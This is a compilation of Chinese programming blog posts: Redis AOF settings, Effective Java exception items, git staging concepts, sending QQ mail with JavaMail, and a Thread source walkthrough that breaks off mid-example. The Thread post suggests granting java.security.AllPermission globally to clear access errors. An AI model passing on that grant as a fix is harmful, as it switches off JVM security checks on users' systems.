loading_loaded_bytes: Number of bytes already loaded.已经加载的文件的大小。
loading_loaded_perc: Same value expressed as a percentage. 已经加载的比例。
loading_eta_seconds: ETA in seconds for the load to be complete. 预计多久加载完毕。
 
AOF的相关参数

appendonly yes
appendfilename "appendonly.aof"

appendfsync everysec

no-appendfsync-on-rewrite no

auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb

aof-load-truncated yes

aof-use-rdb-preamble no

其中，
no-appendfsync-on-rewrite：在执行bgsave或bgrewriteaof操作时，不调用fsync()操作，此时，Redis的持久化策略相当于"appendfsync none"。
aof-load-truncated：在Redis节点启动的时候，如果发现AOF文件已经损坏了，其处理逻辑与该参数的设置有关，若为yes，则会忽略掉错误，尽可能加载较多的数据，若为no，则会直接报错退出。默认为yes。需要注意的是，该参数只适用于Redis启动阶段，如果在Redis运行过程中，发现AOF文件corrupted，Redis会直接报错退出。
aof-use-rdb-preamble：是否启用Redis 4.x提供的AOF+RDB的混合持久化方案，若为yes，在重写AOF文件时，Redis会将数据以RDB的格式作为AOF文件的开始部分。在重写之后，Redis会继续以AOF格式持久化写入操作。默认值为no。
 
参考：
1. 《Redis开发与运维》
2. 《Redis设计与实现》
3. 《Redis 4.X Cookbook》
********************************************************************************************************************************************************************************************************
《Effective Java》学习笔记 ——异常
 
　　充分发挥异常的优点，可以提高程序的可读性、可靠性和可维护性。
 
第57条 只针对异常的情况才使用异常
 
第58条 对可恢复的情况使用受检异常，对编程错误使用运行时异常
　　* 如果期望调用者能够适当的恢复，使用受检异常。
　　* 大多数的运行时异常都表示前提违例（precondition violation），如ArrayIndexOutOfBoundsException。
　　* 错误往往被JVM保留用于表示资源不足、约束失败，或其他无法继续执行的条件。最好不要再实现任何新的Error子类。
 
第59条 避免不必要的使用受检的异常
　
第60条 优先使用标准的异常
　　* 常用异常：IllegalArgumentException、IllegalStatusException、NullPointerException、IndexOutOfBoundsException、ConcurrentModificationException、UnsupportedOperationException等。
 
第61条 抛出与异常相对于的异常
　　* 更高层的实现应该捕获底层的异常，同时抛出可以按照高层抽象进行解释的异常。这种做法被称为异常转义（exception translation），如AbstractSequentialList类的例子：

1     public E get(int index) {
2         try {
3             return listIterator(index).next();
4         } catch (NoSuchElementException exc) {
5             throw new IndexOutOfBoundsException("Index: "+index);
6         }
7     }

　　* 也可以使用异常链（exception chaining）的形式来进行转义，即将底层的异常作为参数传入高层异常。
 
第62条 每个方法抛出的异常都要有文档
　　* 始终要单独的声明受检异常，并利用Javadoc的@throws标记准确的记录下抛出异常的每个条件。
　　* 如果一个类的许多方法出于同样的原因而抛出同一个异常，在该类的文档注释中对这个异常建立文档，是可以接受的。
 
第63条 在细节消息中包含能捕获失败的信息
 
第64条 努力使失败保持原子性
　　* 一般而言，失败的方法调用应该使对象保持在被调用之前的状态。具有这种属性的方法被称为具有失败原子性（failure atomic）。
　　* 获得失败原子性的方法：
　　　　（1）在执行操作之前检查参数的有效性。
　　　　（2）调整计算处理过程的顺序，是的任何可能会失败的计算部分都在对象状态被修改前发生。
　　　　（3）编写一段恢复代码（不常用）。
　　　　（4）在对象的一份临时拷贝上执行操作，当操作完成后在用临时拷贝中的结果代替对象的内容。
 
第65条 不要忽略异常
　　* 至少，catch块也应该包含一条说明，解释为什么可以忽略这个异常。
 
 
本文地址：https://www.cnblogs.com/laishenghao/p/effective_java_note_exception.html
 
********************************************************************************************************************************************************************************************************
git 入门教程之基本概念
基本概念
了解工作区,暂存区和版本库的区别和联系有助于我们更好理解 git 的工作流程,了解命令的操作意图.

git 和其他版本控制系统如 svn 的不同之处就是有暂存区的概念.

基本概念

工作区 | Working Directory

正常情况下能看到的目录(不包括隐藏文件),也就是用户主动创建的目录


暂存区 | Stage

工作区下的隐藏.git目录下的.index文件,因此也称为索引.

版本库 | Repository

工作区下的隐藏目录.git目录

通过前几节我们知道,将文件纳入版本控制,需要分两步操作:

第一步 git add 添加文件,实际上是将文件更改添加到暂存区.
第二步 git commit 提交更改,实际上是将暂存区所有内容提交到当前分支.

我们使用 git init 命令初始化创建 git 仓库时,git 会自动创建唯一一个 master 分支,默认所有操作是在 master 分支上进行的,所以 git commit 就是徃 master 分支上提交更改的.
通俗地讲,文件更改可以多次添加到暂存区,即允许多次执行 git add 命令,然后一次性提交暂存区的全部更改到版本库,即只需要执行一次 git commit 命令即可.
说说个人理解 git 为何分成三部分进行版本控制操作,二部分行不行?
答案是肯定的,没有暂存区概念的 svn 同样可以进行版本控制,所以 git 增加暂存区必然是有存在的意外也就是所谓的好处的.
第一,暂存区的概念允许将本地文件的更改添加进来,也就是说本地文件的更改只有添加到暂存区才能进行下一步的提交更改,所以说那些更改添加到暂存区是由开发者本人决定的,这其实有了一定灵活性,并不是所有的更改都需要被记录!
第二,暂存区作为中间过程,暂存区的内容是打算提交更改的内容,也就是说暂存区可以视为一种临时缓存,用来记录预提交更改.实际工作中,新功能的开发并不是一蹴而就的,是由一系列的更改一起组成的,如果将这些更改分散开来单独提交,那势必会产生很多commit,如果等待全部工作完成再提交的话,解决了过多commit的问题,但是又遇到新问题就是你可能很长时间才能提交一次更改,失去了版本控制的意义.综上所述,暂存区的出现一种很好的解决方案,它允许将相关性代码添加在一起,方便后续提交更改时提交的都是相关性代码!
第三,作为分布式版本控制系统,不像集中式控制系统那样,对网络强相关,失去网络的 svn 是没办法再进行版本控制的,但失去网络的 git 仍然可以进行版本控制,只不过不能远程操作了而已,不过这部分也是无可厚非的,正所谓"巧妇难为无米之炊",你总不能要求断网下继续访问百度吧!
好了,我们继续回到 git 常用操作上,看一下工作区,暂存区和版本库三者如何协同工作的.
首先,先修改test.txt文件.
# 查看 test.txt 文件内容
$ cat test.txt
git test
git init
git diff
understand how git control version
# 追加 how git work 到 test.txt 文件
$ echo "how git work" >> test.txt
# 再次查看 test.txt 文件内容
$ cat test.txt
git test
git init
git diff
understand how git control version
how git work
$ 
紧接着新建newFile.txt 并随便输入内容:
# 查看当前文件夹下全部文件
$ ls .
file1.txt   file2.txt   file3.txt   test.txt
# 创建新文件 newFile.txt
$ touch newFile.txt
# 再次查看当前文件夹下全部文件
$ ls
file1.txt   file2.txt   file3.txt   newFile.txt test.txt
# 输入 add newFile.txt 文件内容 到 newFile.txt 文件
$ echo "add newFile.txt" > newFile.txt
# 查看 newFile.txt 文件内容
$ cat newFile.txt
add newFile.txt
$ 
现在运行git status 命令查看当前文件状态:
$ git status
On branch master
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

    modified:   test.txt

Untracked files:
  (use "git add <file>..." to include in what will be committed)

    .DS_Store
    newFile.txt

no changes added to commit (use "git add" and/or "git commit -a")
$ 
从输出结果中得知,test.txt 文件已修改(modified),还没添加到暂存区,而newFile.txt 文件还没被跟踪(Untracked).
现在我们使用git add 命令将 test.txt 和 newFile.txt 都添加到暂存区,再用 git status 查看文件状态:
# 添加 test.txt 文件
git add test.txt
# 添加 newFile.txt 文件
git add newFile.txt
# 查看文件状态
git status
On branch master
Changes to be committed:
  (use "git reset HEAD <file>..." to unstage)

    new file:   newFile.txt
    modified:   test.txt

Untracked files:
  (use "git add <file>..." to include in what will be committed)

    .DS_Store
$ 
现在输出结果和上次就不一样了,显示的是即将被提交文件,其中newFile.txt 是新文件(new file),test.txt 是修改文件(modified).
所以,git add 命令作用是将需要提交的更改文件临时放到暂存区中,然后执行git commit 命令就可以一次性将暂存区的所有内容提交到当前分支.
$ git commit -m "understand how stage works"
[master a5cd3fb] understand how stage works
 2 files changed, 2 insertions(+)
 create mode 100644 newFile.txt
$ git status
On branch master
Untracked files:
  (use "git add <file>..." to include in what will be committed)

    .DS_Store

nothing added to commit but untracked files present (use "git add" to track)
$ 
暂存区的所有内容提交到版本库,所以运行git status 时,工作区是干净的,即此时暂存区没有内容了!

.DS_Store 是 mac 电脑自动生成的文件,可以暂不理会,等到后面的.gitignore 文件时再处理.

图解
下图展示了工作区,暂存区,版本库之间的关系:

图中左侧是工作区,右侧是版本库,版本库中标记index 的区域是暂存区,标记 master 的是 master 分支所代表的目录树.
HEAD 是指向 master 分支的指针,标记 objects 的区域是 git 的对象库,真实路径位于.git/objects目录下,用于表示创建的对象和内容.
意图说明

git add 添加文件

工作区的修改或者新增的文件执行git add 命令后,暂存区(index)的目录树会自动更新,同时引发这次变化的文件内容会被记录下来,即生成对象库(objects)中的新对象,而对象的 id会被记录到暂存区的文件索引(index)中.

git commit 提交文件

暂存区的目录树写入到对象库(objects),master 分支的目录树自动更新.

git reset HEAD 撤销文件

暂存区的目录树被重写,被master 分支的目录树所替换,但是工作区不受影响.

git rm --cached <file> 删除缓存文件

删除暂存区文件,工作区不受影响.

git checkout . 检出文件

暂存区的文件替换工作区文件,注意:当前尚未添加到暂存区的改动会全部丢失!

git checkout HEAD . 检出文件

HEAD 指针指向的 master 分支中的文件替换暂存区以及工作区文件,注意:不仅清除工作区未提交的改动,连暂存区未提交的改动也会被清除!
小结
以上就是常用命令的背后意图,主要是工作区,暂存区和版本库之间文件同步策略的关系.

git add 是工作区更新到暂存区
git commit 是暂存区更新到版本库
git reset HEAD 是版本库更新到暂存区
git checkout -- <file> 是暂存区更新到工作区
git checkout HEAD <file> 是版本库同时更新暂存区和工作区
git rm --cached 清空暂存区


********************************************************************************************************************************************************************************************************
使用java发送QQ邮件的总结
       最近帮朋友做个网站，实现用邮箱订阅功能，所以现在把这个发送邮件的功能放在这里，算是这两天工作的总结吧！
首先，想要实现订阅功能，要把邮箱保存，但是这个做的是个小网站，前后台交互的太少了，所以我就直接保存在了文件里面，用到的时候，直接读取。
下面是保存邮箱号到本地文件的代码。

 1 package ccom.llf.smfp;
 2 
 3 import java.io.BufferedReader;
 4 import java.io.File;
 5 import java.io.FileNotFoundException;
 6 import java.io.FileReader;
 7 import java.io.FileWriter;
 8 import java.io.IOException;
 9 import java.io.PrintWriter;
10 
11 import javax.servlet.ServletException;
12 import javax.servlet.http.HttpServlet;
13 import javax.servlet.http.HttpServletRequest;
14 import javax.servlet.http.HttpServletResponse;
15 
16 public class SendEmail extends HttpServlet {
17      /**
18      * 如果是get请求就重写doget方法，如果是其他的也是一样对应的
19      */
20     @Override
21     protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
22            String filename =this.getClass().getClassLoader().getResource("/").getPath()+"email.text";
23            String filename1 =this.getClass().getClassLoader().getResource("/").getPath()+"count.text";
24            /*filename = filename.substring(1, filename.length());
25           filename1 = filename1.substring(1, filename1.length());*/
26            response.setContentType("application/text; charset=utf-8");
27            PrintWriter out = response.getWriter();
28            
29            //判断该邮箱时候已经订阅过
30            FileReader fr=new FileReader(filename);
31            BufferedReader br=new BufferedReader(fr);
32            String line="";
33            String[] arrs=null;
34            while ((line=br.readLine())!=null) {
35               if(line.equals(request.getParameter("SendEmail").toString()+"\t")){
36                   out.write("1"); 
37                   return;
38               }
39            }
40            br.close();
41            fr.close();
42            
43            FileWriter writer = new FileWriter(filename, true);
44             //writer.write(request.getParameter("SendEmail").toString()+  ";"+"/r/n");
45             writer.write(request.getParameter("SendEmail").toString()+"\t\n");
46             writer.close();
47 
48              File f = new File(filename1);
49              int count = 0;
50              if (!f.exists()) {
51                  writeFile(filename1, 100);
52              }
53              try {
54                  BufferedReader in = new BufferedReader(new FileReader(f));
55                  try {
56                      count = Integer.parseInt(in.readLine())+1;
57                      writeFile(filename1, count);
58                      out.write(String.valueOf(count));
59                  } catch (NumberFormatException e) {
60                      e.printStackTrace();
61                  } catch (IOException e) {
62                      e.printStackTrace();
63                  }
64              } catch (FileNotFoundException e) {
65                  e.printStackTrace();
66              }
67              
68         
69     }
70 
71     public static void writeFile(String filename, int count) {
72 
73         try {
74             PrintWriter out = new PrintWriter(new FileWriter(filename));
75             out.println(count);
76             out.close();
77         } catch (IOException e) {
78             e.printStackTrace();
79         }
80     }
81 
82 }

这里用到的就是简单的输入输出流 ，就不做过多的讲解。
下面当腰发邮件的时候，需要开启邮箱smtp服务，获取授权码。
我们的是qq邮箱，这里以qq邮箱为例，在QQ邮箱的设置——>账号——>下拉有个pop3/smtp服务  开启，获取授权码。。发邮件的时候，就用到授权码，不直接用密码，这样防止账户安全吧。

package com.poi;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class SendMail2 {

    private String host = "smtp.qq.com"; // smtp服务器
    private static String from = ""; // 发件人邮箱号
    private static String to = ""; // 收件人邮箱号
    private String affix = ""; // 附件地址
    private String affixName = ""; // 附件名称
    private static String user = ""; // 用户名
    private static String pwd = ""; // 授权码
    private String subject = "hello"; // 邮件标题

    public void setAddress(String from, String to, String subject) {
        this.from = from;
        this.to = to;
        this.subject = subject;
    }

    public void setAffix(String affix, String affixName) {
        this.affix = affix;
        this.affixName = affixName;
    }

    public void send(String host, String user, String pwd) {
        this.host = host;
        this.user = user;
        this.pwd = pwd;

        Properties props = new Properties();

        // 设置发送邮件的邮件服务器的属性（这里使用网易的smtp服务器）
        props.put("mail.smtp.host", host);
        // 需要经过授权，也就是有户名和密码的校验，这样才能通过验证
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", 465);
        props.put("mail.smtp.ssl.enable", true);
        // 用刚刚设置好的props对象构建一个session
        Session session = Session.getDefaultInstance(props);

        // 有了这句便可以在发送邮件的过程中在console处显示过程信息，供调试使
        // 用（你可以在控制台（console)上看到发送邮件的过程）
        session.setDebug(true);

        // 用session为参数定义消息对象
        MimeMessage message = new MimeMessage(session);
        try {
            // 加载发件人地址
            message.setFrom(new InternetAddress(from));
            // 加载收件人地址
            message.addRecipient(Message.RecipientType.TO, new InternetAddress(
                    to));
            // 加载标题
            message.setSubject(subject);

            // 向multipart对象中添加邮件的各个部分内容，包括文本内容和附件
            Multipart multipart = new MimeMultipart();

            // 设置邮件的文本内容
            BodyPart contentPart = new MimeBodyPart();
            contentPart.setText("第二种方法···");
            multipart.addBodyPart(contentPart);
            // 添加附件
            BodyPart messageBodyPart = new MimeBodyPart();
            DataSource source = new FileDataSource(affix);
            // 添加附件的内容
            messageBodyPart.setDataHandler(new DataHandler(source));
            // 添加附件的标题
            // 这里很重要，通过下面的Base64编码的转换可以保证你的中文附件标题名在发送时不会变成乱码
            sun.misc.BASE64Encoder enc = new sun.misc.BASE64Encoder();
            messageBodyPart.setFileName("=?GBK?B?"
                    + enc.encode(affixName.getBytes()) + "?=");
            multipart.addBodyPart(messageBodyPart);

            // 将multipart对象放到message中
            message.setContent(multipart);
            // 保存邮件
            message.saveChanges();
            // 发送邮件
            Transport transport = session.getTransport("smtp");
            // 连接服务器的邮箱
            transport.connect(host, user, pwd);
            // 把邮件发送出去
            transport.sendMessage(message, message.getAllRecipients());
            transport.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
     //先往你的本地写一个文件，这样附件就坑定存在了。
        File file = new File("D:\\22.cvg");
        try {
            OutputStream os = new FileOutputStream(file);
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os,
                    "utf-8"));
            bw.write("hello");
            bw.close();
            os.close();
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
            
        
        SendMail2 cn = new SendMail2();
        // 设置发件人地址、收件人地址和邮件标题
        cn.setAddress(from, to, user);
        // 设置要发送附件的位置和标题
        cn.setAffix("D:\\22.cvg", "22.cvg");
        // 设置smtp服务器以及邮箱的帐号和密码
        cn.send("smtp.qq.com", from,pwd);
    }
}

这样我们就可以发送邮件了。。。
********************************************************************************************************************************************************************************************************
并发系列（1）之 Thread 详解
本文主要结合 java.lang.Thread 源码，梳理 Java 线程的整体脉络；
一、线程概述
对于 Java 中的线程主要是依赖于系统的 API 实现的，这一点可以从 java.lang.Thread；源码中关键的方法都是 native 方法看出，也可以直接查看 OpenJDK 源码看出来，这一点后面还会讲到；对于 JDK1.8 而言，他的 Windows 版和 Linux 版使用的都是 1:1 线程模型，即系统内核线程和轻量级进程的比是 1:1；

内核线程（Kernel-Level Thread，KLT）：是由操作系统内核（Kernel）直接支持的线程，这种线程由内核来完成切换，内核通过调度器（Schedule）进行调度，并负责将线程的任务映射到各个处理器上；
轻量级进程（Light Weight Process，LWP）：程序可以直接使用的一种内核线程高级接口，也就是我们通常意义上的线程；

如图所示：

优点：

由内核线程的支持，每个线程都成为一个独立的调度单元，即线程之间不会相互阻塞影响；使用内核提供的线程调度功能及处理器映射，可以完成线程的切换，并将线程的任务映射到其他处理器上，充分利用多核处理器的优势，实现真正的并行。

缺点：

同时由于基于内核线程实现，线程的创建、关闭、同步等操作都需要系统调用；需要在用户态和内核态之间切换，代价相对较高；
另外每个线程都需要消耗一定的内核资源，如内核线程的栈空间，所以系统支持的轻量级进程是有限的；

二、线程状态
Java 线程的整个生命周期可能会经历以下5中状态，如图所示：


新建（New）：新建后未启动的线程；
运行（Runnable）：包括运行中（Running）和就绪（Ready）两种状态；也就是正在运行，或者等待 CPU 分配执行时间；
等待（Waiting）：无限期的等待其他线程显示唤醒；
超时等待（Timed_Waiting）：一定时间内没有被其他线程唤醒，则由系统自动唤醒；
阻塞（Blocked）：等待获取排它锁；
终止（Terminated）：运行终止；

三、源码分析
1. native注册
/* Make sure registerNatives is the first thing <clinit> does. */
private static native void registerNatives();
static {
  registerNatives();
}
这段代码在很多地方都出现过，比如：
java.lang.System
java.lang.Object
java.lang.Class
其作用就是在使用 JNI 时需要向 JVM 注册，其方法名默认为 Java_<fully qualified class name>_method；但是如果觉得这样的名字太长，这是就可以使用 registerNatives() 向 JVM 注册任意的函数名；
Thread 中的 native 方法有：
private native void start0();
private native void stop0(Object o);
public final native boolean isAlive();
private native void suspend0();
private native void resume0();
private native void setPriority0(int newPriority);
public static native void yield();
public static native void sleep(long millis) throws InterruptedException;
public static native Thread currentThread();
public native int countStackFrames();
private native void interrupt0();
private native boolean isInterrupted(boolean ClearInterrupted);
public static native boolean holdsLock(Object obj);
private native static Thread[] getThreads();
private native static StackTraceElement[][] dumpThreads(Thread[] threads);
private native void setNativeName(String name);
其对应 JVM 源码
// openjdk\jdk\src\share\native\java\lang\Thread.c
static JNINativeMethod methods[] = {
    {"start0",           "()V",              (void *)&JVM_StartThread},
    {"stop0",            "(" OBJ ")V",       (void *)&JVM_StopThread},
    {"isAlive",          "()Z",              (void *)&JVM_IsThreadAlive},
    {"suspend0",         "()V",              (void *)&JVM_SuspendThread},
    {"resume0",          "()V",              (void *)&JVM_ResumeThread},
    {"setPriority0",     "(I)V",             (void *)&JVM_SetThreadPriority},
    {"yield",            "()V",              (void *)&JVM_Yield},
    {"sleep",            "(J)V",             (void *)&JVM_Sleep},
    {"currentThread",    "()" THD,           (void *)&JVM_CurrentThread},
    {"countStackFrames", "()I",              (void *)&JVM_CountStackFrames},
    {"interrupt0",       "()V",              (void *)&JVM_Interrupt},
    {"isInterrupted",    "(Z)Z",             (void *)&JVM_IsInterrupted},
    {"holdsLock",        "(" OBJ ")Z",       (void *)&JVM_HoldsLock},
    {"getThreads",        "()[" THD,         (void *)&JVM_GetAllThreads},
    {"dumpThreads",      "([" THD ")[[" STE, (void *)&JVM_DumpThreads},
    {"setNativeName",    "(" STR ")V",       (void *)&JVM_SetNativeThreadName},
};
其具体实现可以查看
openjdk\hotspot\src\share\vm\prims\jvm.h
openjdk\hotspot\src\share\vm\prims\jvm.cpp
2. 构造方法和成员变量
public class Thread implements Runnable {
  private volatile String name;        // 线程名称，如果没有指定，就通过 Thread-线程序列号 命名
  private int priority;                // 线程优先级，1-10 默认与父线程优先级相同(main 线程优先级为 5)
  private boolean daemon = false;      // 是否是守护线程
  private Runnable target;             // Runnable 对象
  private ThreadGroup group;           // 所属线程组
  ThreadLocal.ThreadLocalMap threadLocals = null;             // 线程本地变量
  ThreadLocal.ThreadLocalMap inheritableThreadLocals = null;  // 可继承的线程本地变量
  private long tid;                                           // 线程 tid
  
  ...

  public Thread() {
    init(null, null, "Thread-" + nextThreadNum(), 0);
  }

  public Thread(Runnable target) {
    init(null, target, "Thread-" + nextThreadNum(), 0);
  }

  public Thread(ThreadGroup group, Runnable target) {
    init(group, target, "Thread-" + nextThreadNum(), 0);
  }

  public Thread(String name) {
    init(null, null, name, 0);
  }

  public Thread(ThreadGroup group, String name) {
    init(group, null, name, 0);
  }

  public Thread(Runnable target, String name) {
    init(null, target, name, 0);
  }

  public Thread(ThreadGroup group, Runnable target, String name) {
    init(group, target, name, 0);
  }

  public Thread(ThreadGroup group, Runnable target, String name, long stackSize) {
    init(group, target, name, stackSize);
  }
  
  private void init(ThreadGroup g, Runnable target, String name, long stackSize, AccessControlContext acc, boolean inheritThreadLocals) {
    if (name == null) {
      throw new NullPointerException("name cannot be null");
    }

    this.name = name;

    Thread parent = currentThread();
    SecurityManager security = System.getSecurityManager();
    if (g == null) {
      if (security != null) {
        g = security.getThreadGroup();
      }
      if (g == null) {
        g = parent.getThreadGroup();
      }
    }
    
    g.checkAccess();

    if (security != null) {
      if (isCCLOverridden(getClass())) {
        security.checkPermission(SUBCLASS_IMPLEMENTATION_PERMISSION);
      }
    }

    g.addUnstarted();

    this.group = g;
    this.daemon = parent.isDaemon();
    this.priority = parent.getPriority();
    if (security == null || isCCLOverridden(parent.getClass()))
      this.contextClassLoader = parent.getContextClassLoader();
    else
      this.contextClassLoader = parent.contextClassLoader;
    this.inheritedAccessControlContext = acc != null ? acc : AccessController.getContext();
    this.target = target;
    setPriority(priority);
    if (inheritThreadLocals && parent.inheritableThreadLocals != null)
      this.inheritableThreadLocals = ThreadLocal.createInheritedMap(parent.inheritableThreadLocals);
    this.stackSize = stackSize;
    tid = nextThreadID();
  }

  ...
  
}
可以看到左右的构造方法最终都会调用 init()；并初始化所属线程组、名字、 Runnable、栈大小等信息；整个过程相当于配置了一个线程工厂，此时只是初始化了所有的配置，线程还没有真正创建，当然资源同样也还没有分配，只有在调用 start() 的时候线程才会真正创建；
此外可以看到线程创建过程中会有很多的权限检查，例如：
SecurityManager security = System.getSecurityManager();
if (security != null) {
  if (isCCLOverridden(getClass())) {
    security.checkPermission(SUBCLASS_IMPLEMENTATION_PERMISSION);
  }
}
通常情况下权限的检查默认是没有开启的，所以 security 一直都是 null ；这里需要在启动 JVM 的时候指定 -Djava.security.manager ；当然也可以指定特定的 SecurityManager；但是在开启的时候很可能会遇到类似：java.security.AccessControlException: access denied ；权限检查失败的错误；
此时可以在 jre\lib\security\java.policy 中添加相应的权限；或者直接开启所有权限 permission java.security.AllPermission;
// jre\lib\security\java.policy

grant {
  permission java.lang.RuntimePermission "stopThread";
  permission java.net.SocketPermission "localhost:0", "listen";
  permission java.util.PropertyPermission "java.version", "read";

  ...

  permission java.security.AllPermission;
};
3. start 方法
public synchronized void start() {
  if (threadStatus != 0) throw new IllegalThreadStateException();
  group.add(this);
  boolean started = false;
  try {
    start0();
    started = true;
  } finally {
    try {
      if (!started) {
        group.threadStartFailed(this);
      }
    } catch (Throwable ignore) {
      //
    }
  }
}

private native void start0();
可以看到这是一个同步方法，并且同一个线程不能启动两次；这里首先将线程加入对应的线程组，再真正创建线程，如果创建失败就在线程组中标记；对应的这个 native 方法 start0 ，的源码同样可以查看 openjdk\hotspot\src\share\vm\prims\jvm.cpp，这里就不详细介绍了；
4. exit 方法
private void exit() {
  if (group != null) {
    group.threadTerminated(this);
    group = null;
  }
  /* Aggressively null out all reference fields: see bug 4006245 */
  target = null;
  /* Speed the release of some of these resources */
  threadLocals = null;
  inheritableThreadLocals = null;
  inheritedAccessControlContext = null;
  blocker = null;
  uncaughtExceptionHandler = null;
}
exit 方法则是由系统调用，在 Thread 销毁前释放资源；
5. 弃用方法
在源码里面还有几个弃用的方法：
public final void stop() { }            // 停止线程
public final void suspend() { }         // 暂停线程
public final void resume() { }          // 恢复线程

stop：停止线程会导致它解锁已锁定的所有监视器，从而产生同步问题，因为它本质上是不安全的。
suspend：暂停线程容易出现死锁，如果目标线程在监视器上保持锁定，那么在恢复目标线程之前，任何线程都无法访问此资源。
resume：恢复线程同样容易出现死锁， 如果 A 线程在恢复 B 线程之前锁定监视器，然后在调用 resume 恢复 B，此时 B 会尝试再次获取锁，这样就会导致死锁。


四、线程通讯
其实所有的多线程问题，其本质都是线程之间的通讯问题，也有的说是通讯和同步两个问题（线程间操作的顺序）；但我觉得同步仍然是线程之间通过某种方式进行通讯，确定各自执行的相对顺序；所以仍然可以算作是一种通讯问题；这里线程之间的通讯问题可以分成两种：

共享变量，类似锁对象、volatile、中断等操作都可以算是共享变量通讯；
消息传递，类似 wait\notify、管道等则可以算是通过消息直接传递通讯；

下面我们将介绍和 Thread 类直接相关的几种通讯，关于锁的部分之后的博客还会详细介绍；
1. wait\notify 机制
@Slf4j public class WaitNotify {
  private static boolean flag = true;
  private static final Object LOCK = new Object();

  public static void main(String[] args) throws Exception {
    Thread waitThread = new Thread(new Wait(), "WaitThread");
    waitThread.start();
    TimeUnit.SECONDS.sleep(1);

    Thread notifyThread = new Thread(new Notify(), "NotifyThread");
    notifyThread.start();
  }

  private static class Wait implements Runnable {
    @Override
    public void run() {
      // 加锁，拥有lock的Monitor
      synchronized (LOCK) {
        // 当条件不满足时，继续wait，同时释放了lock的锁
        while (flag) {
          try {
            log.info("flag is true. wait");
            LOCK.wait();
          } catch (InterruptedException e) {
          }
        }
        // 条件满足时，完成工作
        log.info("flag is false. running");
      }
    }
  }

  private static class Notify implements Runnable {
    @Override
    public void run() {
      // 加锁，拥有lock的Monitor
      synchronized (LOCK) {
        // 获取lock的锁，然后进行通知，通知时不会释放lock的锁，
        // 直到当前线程释放了lock后，WaitThread才能从wait方法中返回
        log.info("hold lock. notify");
        LOCK.notify();
        flag = false;
        SleepUtils.second(5);
      }
      // 再次加锁
      synchronized (LOCK) {
        log.info("hold lock again. sleep");
        SleepUtils.second(5);
      }
    }
  }
}
// 打印：
[13 21:18:18,533 INFO ] [WaitThread]   WaitNotify - flag is true. wait
[13 21:18:19,533 INFO ] [NotifyThread] WaitNotify - hold lock. notify
[13 21:18:24,535 INFO ] [NotifyThread] WaitNotify - hold lock again. sleep
[13 21:18:29,536 INFO ] [WaitThread]   WaitNotify - flag is false. running
2. join
@Slf4j public class Join {
  public static void main(String[] args) throws Exception {
    Thread previous = Thread.currentThread();
    for (int i = 0; i < 5; i++) {
      // 每个线程拥有前一个线程的引用，需要等待前一个线程终止，才能从等待中返回
      Thread thread = new Thread(new Domino(previous), String.valueOf(i));
      thread.start();
      previous = thread;
    }

    TimeUnit.SECONDS.sleep(5);
    log.info("terminate.");
  }

  private static class Domino implements Runnable {
    private Thread thread;

    public Domino(Thread thread) {
      this.thread = thread;
    }

    @Override
    public void run() {
      try {
        thread.join();
      } catch (InterruptedException e) {
      }
      log.info("terminate.");
    }
  }
}
// 打印：
[13 21:27:27,573 INFO ] [main] Join - terminate.
[13 21:27:27,574 INFO ] [0]    Join - terminate.
[13 21:27:27,574 INFO ] [1]    Join - terminate.
[13 21:27:27,574 INFO ] [2]    Join - terminate.
[13 21:27:27,574 INFO ] [3]    Join - terminate.
[13 21:27:27,574 INFO ] [4]    Join - terminate.
3. interrupt
以上 wait\notify、join 都比较简单，大家直接看代码应该就能理解；但是 interrupt 机制 则比较复杂一点，我们先从源码分析；
interrupt 方法：
private volatile Interruptible blocker;
private final Object blockerLock = new Object();

// Set the blocker field; invoked via sun.misc.SharedSecrets from java.nio code
void blockedOn(Interruptible b) {
  synchronized (blockerLock) {
    blocker = b;
  }
}

public void interrupt() {
  if (this != Thread.currentThread()) checkAccess();

  synchronized (blockerLock) {
    Interruptible b = blocker;
    if (b != null) {
      interrupt0();       // Just to set the interrupt flag
      b.interrupt(this);
      return;
    }
  }
  interrupt0();
}

private native void interrupt0();
在 Thread 的源码上有详细的注释，以下我简单翻译：

如果线程处于 WAITINF、TIMED_WAITING （正阻塞于 Object 类的 wait()、wait(long)、wait(long, int)方法，或者 Thread 类的 join()、join(long)、join(long, int)、sleep(long)、sleep(long, int)方法），则该线程的中断状态将被清除，并收到一个 java.lang.InterruptedException；
如果线程正阻塞于 InterruptibleChannel 上的 I/O 操作，则该通道将被关闭，同时该线程的中断状态被设置，并收到一个java.nio.channels.ClosedByInterruptException；
如果线程正阻塞于 java.nio.channels.Selector 操作，则该线程的中断状态被设置，同时它将立即从选择操作返回，并可能带有一个非零值，其效果同 java.nio.channels.Selector.wakeup() 方法一样；
如果上述条件都不成立，则该线程的中断状态将被设置；

其中 Interruptible blocker 就是在 NIO 操作的时候通过 sun.misc.SharedSecrets 设置的（其效果同反射，但是不会生成其他对象，也就是不会触发 OOM）；

interrupted 、isInterrupted 方法：
public static boolean interrupted() {
  return currentThread().isInterrupted(true);
}

public boolean isInterrupted() {
  return isInterrupted(false);
}

private native boolean isInterrupted(boolean ClearInterrupted);
可以很清楚的看到他们都是通过 isInterrupted(boolean ClearInterrupted) 方法实现的，但是 interrupted 会清除中断状态，而 isInterrupted 则不会清除；
以上 interrupt 机制 就通过设置 interrupt flag，查询中断状态，以及中断异常构成了一套完整的通讯机制；也可以看作是通过 interrupt flag 共享变量实现的，下面我们简单举例：
@Slf4j public class Interrupted {
  public static void main(String[] args) throws Exception {
    // sleepThread不停的尝试睡眠
